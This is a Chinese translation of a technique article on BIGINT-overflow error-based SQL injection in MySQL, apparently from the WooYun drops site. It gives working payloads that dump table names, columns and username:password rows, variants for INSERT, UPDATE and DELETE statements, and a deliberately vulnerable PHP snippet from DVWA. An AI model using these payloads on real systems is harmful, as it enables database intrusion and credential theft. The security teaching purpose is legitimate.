@@ -1,0 +1,113 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">基于BIGINT溢出错误的SQL注入</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mssp299</a> <span class="bull">·</span> <time title="2015/08/18 11:09" ui-time="" datetime="2015/08/18 11:09" class="published ng-binding ng-isolate-scope">2015/08/18 11:09</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>译者：mssp299</p><p>原文地址：<a href="https://osandamalith.wordpress.com/2015/07/08/bigint-overflow-error-based-sql-injection/">https://osandamalith.wordpress.com/2015/07/08/bigint-overflow-error-based-sql-injection/</a></p><h1>0x01 概述</h1><hr><p>我对于通过MySQL错误提取数据的新技术非常感兴趣，而本文中要介绍的就是这样一种技术。当我考察MySQL的整数处理方式的时候，突然对如何使其发生溢出产生了浓厚的兴趣。下面，我们来看看MySQL是如何存储整数的。</p><p><img alt="enter image description here" img-src="3130ad6d13ef251288ee243b1ce6929f7b9fe66d.jpg"></p><p>(来源：<a href="http://dev.mysql.com/doc/refman/5.5/en/integer-types.html">http://dev.mysql.com/doc/refman/5.5/en/integer-types.html</a>)</p><p>只有5.5.5及其以上版本的MySQL才会产生溢出错误消息，之下的版本对于整数溢出不会发送任何消息。</p><p>数据类型BIGINT的长度为8字节，也就是说，长度为64比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”。 当对这个值进行某些数值运算的时候，比如加法运算，就会引起“BIGINT value is out of range”错误。</p><pre><code>mysql&gt; select 9223372036854775807+1;
+ERROR 1690 (22003): BIGINT value is out of range in '(9223372036854775807 + 1)'
+</code></pre><p>为了避免出现上面这样的错误，我们只需将其转换为无符号整数即可。</p><p>对于无符号整数来说，BIGINT可以存放的最大值用二进制、十六进制和十进制表示的话，分别为“<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>”、“<code>0xFFFFFFFFFFFFFFFF</code>”和“<code>18446744073709551615</code>”。</p><p>同样的，如果对这个值进行数值表达式运算，如加法或减法运算，同样也会导致“BIGINT value is out of range”错误。</p><pre><code># In decimal
+mysql&gt; select 18446744073709551615+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
+
+# In binary
+mysql&gt; select cast(b'1111111111111111111111111111111111111111111111111111111111111111' as unsigned)+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned) + 1)'
+
+# In hex
+mysql&gt; select cast(x'FFFFFFFFFFFFFFFF' as unsigned)+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned) + 1)'
+</code></pre><p>如果我们对数值0逐位取反，结果会怎么样呢？ 当然是得到一个无符号的最大BIGINT值，这一点是显而易见的。</p><pre><code>mysql&gt; select ~0;
++----------------------+
+| ~0 |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+</code></pre><p>所以，如果我们对~0进行加减运算的话，也会导致BIGINT溢出错误。</p><pre><code>mysql&gt; select 1-~0;
+ERROR 1690 (22003): BIGINT value is out of range in '(1 - ~(0))'
+mysql&gt; select 1+~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'
+</code></pre><h1>0x002 注入技术</h1><hr><p>我的想法是，利用子查询引起BITINT溢出，从而设法提取数据。我们知道，如果一个查询成功返回，其返回值为0，所以对其进行逻辑非的话就会变成1，举例来说，如果我们对类似(<code>select*from(select user())x</code>)这样的查询进行逻辑非的话，就会有：</p><pre><code>mysql&gt; select (select*from(select user())x);
++-------------------------------+
+| (select*from(select user())x) |
++-------------------------------+
+| <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bac8d5d5cefad6d5d9dbd6d2d5c9ce">[email&#160;protected]</a> |
++-------------------------------+
+1 row in set (0.00 sec)
+# Applying logical negation
+mysql&gt; select !(select*from(select user())x);
++--------------------------------+
+| !(select*from(select user())x) |
++--------------------------------+
+| 1 |
++--------------------------------+
+1 row in set (0.00 sec)
+</code></pre><p>是的，太完美了！ 所以说，只要我们能够组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><pre><code>mysql&gt; select ~0+!(select*from(select user())x);
+ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ddfaafb2b2a99db1b2bebcb1b5b2aea9">[email&#160;protected]</a>' from dual))))'
+</code></pre><p>我们先不使用加法，因为“+”通过网页浏览器进行解析的时候，会被转换为空白符（不过，你可以使用%2b来表示“+”）。 相反，我们可以使用减法。所以说，同一种注入攻击，可以有完全不同的变种。 最终的查询语句如下所示。</p><pre><code>!(select*from(select user())x)-~0
+
+(select(!x-~0)from(select(select user())x)a)
+
+(select!x-~0.from(select(select user())x)a)
+</code></pre><p>举例来说，我们可以像下面一样，在一个查询语句中进行注入操作。</p><pre><code>mysql&gt; select username, password from users where id='1' or !(select*from(select user())x)-~0;
+ERROR 1690 (22003): BIGINT value is out of range in '((not((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9cbbeef3f3e8dcf0f3fffdf0f4f3efe8">[email&#160;protected]</a>' from dual))) - ~(0))'
+</code></pre><p>&lt;http://localhost/dvwa/vulnerabilities/sqli/?id=1' or !(select*from(select user())x)-~0&#45;- -|&amp;Submit=Submit#></p><p><img alt="enter image description here" img-src="ee68e44ce6eb0ed46eda9aa9a7d1de45ce192e93.jpg"></p><p>利用这种基于BIGINT溢出错误的注入手法，我们可以几乎可以使用MySQL中所有的数学函数，因为它们也可以进行取反，具体用法如下所示：</p><pre><code>select !atan((select*from(select user())a))-~0; 
+select !ceil((select*from(select user())a))-~0;
+select !floor((select*from(select user())a))-~0;
+</code></pre><p>下面的我们已经测试过了，如果你愿意的话，还可以找到更多:)</p><pre><code>HEX
+IN
+FLOOR
+CEIL
+RAND
+CEILING
+TRUNCATE
+TAN
+SQRT
+ROUND
+SIGN
+</code></pre><h1>0x003 提取数据</h1><hr><p>提取数据的方法，跟其他注入攻击手法中的一样，这里只做简单介绍。</p><p>首先，我们来获取表名：</p><pre><code>!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0
+</code></pre><p>取得列名：</p><pre><code>select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;
+</code></pre><p>检索数据：</p><pre><code>!(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;
+</code></pre><p><img alt="enter image description here" img-src="d199fdfe6dbba7d7352e813eef4ed44bcebaba07.jpg"></p><h1>0x004 一次性转储</h1><hr><p>我们能够一次性转储所有数据库、列和数据表吗？ 答案是肯定的。但是，当我们从所有数据库中转储数据表和列的时候，只能得到较少的结果，毕竟我们是通过错误消息来检索数据的。 不过，如果我们是从当前数据库中转储数据的话，一次最多可以转储27个结果。下面举例说明。</p><pre><code>!(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
+(select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
+(select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
+</code></pre><p><img alt="enter image description here" img-src="d240884f88f6930b7d006daa66b8bd0b650f402a.jpg"></p><p>这些限制了我们可以检索的结果的数量，即最多27个。假设，我们在一个数据库中创建了一个31列的数据表。 那么，我们只能看到27个结果，而我的其他4个表和该用户数据表的其他列都无法返回。</p><p><img alt="enter image description here" img-src="50fa947f403f0144de73c43d1d6354401cc23648.jpg"></p><h1>0x05 利用插入语句进行注入</h1><hr><p>利用插入语句，我们也可以进行类似的注入攻击，具体语法为<code>‘’ or (payload) or “”</code>。</p><pre><code>mysql&gt; insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0 or '', 'Eyre');
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1334617c7c67537f7c70727f7b7c6067">[email&#160;protected]</a>' from dual))) - ~(0))'
+</code></pre><p>我们还可以使用DIOS查询。</p><pre><code>insert into users (id, username, password) values (2, '' or !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0 or '', 'Eyre');
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+newdb::users::id
+newdb::users::username
+newdb::users::password' from dual))) - ~(0))'
+</code></pre><p><img alt="enter image description here" img-src="01c8ea230aa57d0b7c177e29884296437dd5a543.jpg"></p><h1>0x06 利用更新语句进行注入</h1><hr><p>利用更新语句，我们照样可以进行类似的注入，具体如下所示：</p><pre><code>mysql&gt; update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="785f0a17170c3814171b191410170b0c">[email&#160;protected]</a>' from dual))) - ~(0))'
+</code></pre><h1>0x07 利用更新语句进行注入</h1><hr><p>同样的，我们也可以利用删除语句进行注入，具体如下所示：</p><pre><code>mysql&gt; delete from users where id='1' or !(select*from(select user())x)-~0 or '';
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dff8adb0b0ab9fb3b0bcbeb3b7b0acab">[email&#160;protected]</a>' from dual))) - ~(0))'
+</code></pre><h1>0x08 小结</h1><hr><p>本文的攻击之所以得逞，是因为<code>mysql_error()</code>会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。对于这些溢出攻击，还有许多不同的形式。 例如：</p><pre><code>mysql&gt; select !1-0^222;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(1)) - (0 ^ 222))'
+mysql&gt; select !(select*from(select user())a)-0^222;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3c1b4e5353487c50535f5d5054534f48">[email&#160;protected]</a>' from dual))) - (0 ^ 222))'
+</code></pre><p>此外，后端代码中的引用、双引号或括号问题，也会引起注入攻击。举例来说，如果利用DVWA修改PHP代码去掉引号， 无需前面类似的或操作就能进行注入了。</p><pre><code>#!php
+&lt;?php   
+
+if(isset($_GET['Submit'])){
+
+    // Retrieve data
+
+    $id = $_GET['id'];
+
+    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
+    $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );
+
+    $num = mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i &lt; $num) {
+
+        $first = mysql_result($result,$i,"first_name");
+        $last = mysql_result($result,$i,"last_name");
+
+        $html .= '&lt;pre&gt;';
+        $html .= 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last;
+        $html .= '&lt;/pre&gt;';
+
+        $i++;
+    }
+}
+?&gt;
+</code></pre><p>&lt;http://localhost/dvwa/vulnerabilities/sqli/?id=!(select*from(select user())a)-0^222 &amp;Submit=Submit#></p><p><img alt="enter image description here" img-src="929cf770fcebda8ea737c24b9571e5da314e2347.jpg"></p><p>我希望本文对大家的渗透测试工作能够有所帮助。</p><h1>0x09 参考资料</h1><hr><p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/116.png">1</a> <a href="http://dev.mysql.com/doc/refman/5.5/en/integer-types.html">http://dev.mysql.com/doc/refman/5.5/en/integer-types.html</a></p><p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/217.png">2</a> <a href="https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html">https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html</a></p><p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/314.png">3</a> <a href="https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html">https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2016-03-09 13:57:47</span></div><p></p><p>@Manning 真现实</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2015-12-09 09:18:22</span></div><p></p><p>学习了，谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">凉粉</span> <span class="reply-time">2015-08-21 09:20:11</span></div><p></p><p>学习了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">禅系一之花</span> <span class="weibo"></span> <span class="reply-time">2015-08-19 17:18:17</span></div><p></p><p>翻译投稿的作品有乌云奖金吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">s4cr00t</span> <span class="reply-time">2015-08-19 09:42:41</span></div><p></p><p>不错，学习了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">MySQL</span> <span class="weibo"></span> <span class="reply-time">2015-08-19 09:30:04</span></div><p></p><p>基于BIGINT溢出错误的SQL注入</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Cyrils</span> <span class="reply-time">2015-08-18 19:28:52</span></div><p></p><p>这个我记得在zone里看见过..</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Manning</span> <span class="reply-time">2015-08-18 11:31:01</span></div><p></p><p>然并卵啊，都报错注入了，我还在乎用哪种方法吗？</p><p></p></div></div></div></div></div></main>
